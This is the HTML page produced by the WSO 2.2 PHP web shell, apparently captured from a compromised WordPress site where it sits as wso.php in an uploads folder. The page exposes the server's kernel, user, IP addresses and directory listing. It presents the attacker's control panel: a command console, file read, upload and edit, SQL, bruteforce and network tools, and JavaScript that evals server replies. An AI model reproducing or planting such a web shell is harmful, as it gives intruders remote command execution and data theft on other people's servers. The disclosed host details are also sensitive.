<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title>www.veejayhq.net - WSO 2.2</title>
<style>
body{background-color:#444;color:#e1e1e1;}
body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ color:#fff;background-color:#222; }
span,h1,a{ color:#df5 !important; }
span{ font-weight: bolder; }
h1{ border-left:5px solid #df5;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
div.content{ padding: 5px;margin-left:5px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:250px; }
input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid #df5; font: 9pt Monospace,"Courier New"; }
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#5e5e5e;}
.main tr:hover{background-color:#5e5e5e}
.l1{background-color:#444}
pre{font-family:Courier,Monospace;}
</style>
<script>
	var c_ = '/var/www/vhosts/veejayhq.net/httpdocs/wp-content/uploads/2009/10/';
	var a_ = 'FilesMan';
	var p1_ = '';
	var p2_ = '';
	var p3_ = '';
	var charset_ = 'UTF-8';
	function set(a,c,p1,p2,p3,charset) {
		if(a != null)document.mf.a.value=a;else document.mf.a.value=a_;
		if(c != null)document.mf.c.value=c;else document.mf.c.value=c_;
		if(p1 != null)document.mf.p1.value=p1;else document.mf.p1.value=p1_;
		if(p2 != null)document.mf.p2.value=p2;else document.mf.p2.value=p2_;
		if(p3 != null)document.mf.p3.value=p3;else document.mf.p3.value=p3_;
		if(charset != null)document.mf.charset.value=charset;else document.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		document.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = "ajax=true";
		for(i=0;i<document.mf.elements.length;i++)
			params += "&"+document.mf.elements[i].name+"="+encodeURIComponent(document.mf.elements[i].value);
		sr('/wp-content/uploads/2009/10/wso.php', params);
	}
	function sr(url, params) {	
		if (window.XMLHttpRequest) {
			req = new XMLHttpRequest();
			req.onreadystatechange = processReqChange;
			req.open("POST", url, true);
			req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
			req.send(params);
		} 
		else if (window.ActiveXObject) {
			req = new ActiveXObject("Microsoft.XMLHTTP");
			if (req) {
				req.onreadystatechange = processReqChange;
				req.open("POST", url, true);
				req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
				req.send(params);
			}
		}
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp("(\\d+)([\\S\\s]*)", "m");
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} 
			else alert("Request error!");
	}
</script>
<head><body><div style="position:absolute;width:100%;background-color:#444;top:0;left:0;">
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>
<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux srv12043.hostingserver.nl 2.6.32-431.11.2.el6.x86_64 #1 SMP Tue Mar 25 19:59:55 UTC 2014 x86_64  <a href="http://www.google.com/search?q=Linux+srv12043.hostingserver.nl+2.6.32-431.11.2.el6.x86_64+%231+SMP+Tue+Mar+25+19%3A59%3A55+UTC+2014+x86_64" target="_blank">[Google]</a> <a href="http://milw0rm.com/search.php?dong=Linux+Kernel+2.6.32" target=_blank>[milw0rm]</a></nobr><br>10080 ( sitemaster_5 ) <span>Group:</span> 503 ( psacln )<br>5.2.17 <span>Safe mode:</span> <font color=#00bb00><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2014-06-09 23:34:37<br>57.59 GB <span>Free:</span> 9.49 GB (16%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/var/")'>var/</a><a href='#' onclick='g("FilesMan","/var/www/")'>www/</a><a href='#' onclick='g("FilesMan","/var/www/vhosts/")'>vhosts/</a><a href='#' onclick='g("FilesMan","/var/www/vhosts/veejayhq.net/")'>veejayhq.net/</a><a href='#' onclick='g("FilesMan","/var/www/vhosts/veejayhq.net/httpdocs/")'>httpdocs/</a><a href='#' onclick='g("FilesMan","/var/www/vhosts/veejayhq.net/httpdocs/wp-content/")'>wp-content/</a><a href='#' onclick='g("FilesMan","/var/www/vhosts/veejayhq.net/httpdocs/wp-content/uploads/")'>uploads/</a><a href='#' onclick='g("FilesMan","/var/www/vhosts/veejayhq.net/httpdocs/wp-content/uploads/2009/")'>2009/</a><a href='#' onclick='g("FilesMan","/var/www/vhosts/veejayhq.net/httpdocs/wp-content/uploads/2009/10/")'>10/</a> <font color=#00BB00><b>drwxrwxrwx</b></font> <a href=# onclick="g('FilesMan','/var/www/vhosts/veejayhq.net/httpdocs/wp-content/uploads/2009/10','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset"><option value="UTF-8" selected>UTF-8</option><option value="Windows-1251" >Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></optgroup></select><br><span>Server IP:</span><br>85.158.248.54<br><span>Client IP:</span><br>82.173.128.61</nobr></td></tr></table><table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr><th width="10%">[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th width="10%">[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th width="10%">[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th width="10%">[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th width="10%">[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th width="10%">[ <a href="#" onclick="g('SafeMode',null,'','','')">Safe mode</a> ]</th><th width="10%">[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th width="10%">[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th width="10%">[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th width="10%">[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div style="margin:5"><h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script><script>
	function sa() {
		for(i=0;i<document.files.elements.length;i++)
			if(document.files.elements[i].type == 'checkbox')
				document.files.elements[i].checked = document.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post>
<tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g("FilesMan",null,"s_name_0")'>Name</a></th><th><a href='#' onclick='g("FilesMan",null,"s_size_0")'>Size</a></th><th><a href='#' onclick='g("FilesMan",null,"s_modify_0")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g("FilesMan",null,"s_perms_0")'>Permissions</a></th><th>Actions</th></tr><tr><td><input type=checkbox name="f[]" value=".." class=chkbx></td><td><a href=# onclick="g('FilesMan','/var/www/vhosts/veejayhq.net/httpdocs/wp-content/uploads/2009/10/..');"><b>[ .. ]</b></a></td><td>dir</td><td>2014-05-22 01:13:19</td><td>sitemaster_5/psacln</td><td><a href=# onclick="g('FilesTools',null,'..','chmod')"><font color=#00BB00><b>drwxrwxrwx</b></font></td><td><a href="#" onclick="g('FilesTools',null,'..', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'..', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="wso.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'wso.php', 'view')">wso.php</a></td><td>64.55 KB</td><td>2014-05-22 01:13:19</td><td>sitemaster_5/psacln</td><td><a href=# onclick="g('FilesTools',null,'wso.php','chmod')"><font color=#00BB00><b>-rwxrwxrwx</b></font></td><td><a href="#" onclick="g('FilesTools',null,'wso.php', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'wso.php', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'wso.php', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'wso.php', 'download')">D</a></td></tr>	<tr><td colspan=7>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='/var/www/vhosts/veejayhq.net/httpdocs/wp-content/uploads/2009/10/'>
	<input type=hidden name=charset value='UTF-8'>
	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><option value='zip'>Compress (zip)</option><option value='unzip'>Uncompress (zip)</option></select>&nbsp;<input type="submit" value=">>"></td></tr>
	</form></table></div>
	</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style="border-top:2px solid #333;border-bottom:2px solid #333;">
	<tr>
		<td><form onsubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="/var/www/vhosts/veejayhq.net/httpdocs/wp-content/uploads/2009/10/"><input type=submit value=">>"></form></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form></td>
	</tr>
	<tr>
		<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value=">>"></form><font color=green>[ Writeable ]</font></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form><font color=green>[ Writeable ]</font></td>
	</tr>
	<tr>
		<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class="toolsInp" type=text name=c value=""><input type=submit value=">>"></form></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='/var/www/vhosts/veejayhq.net/httpdocs/wp-content/uploads/2009/10/'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='UTF-8'>
		<span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value=">>"></form><font color=green>[ Writeable ]</font></td>
	</tr>

</table>
</div>
</body></html>

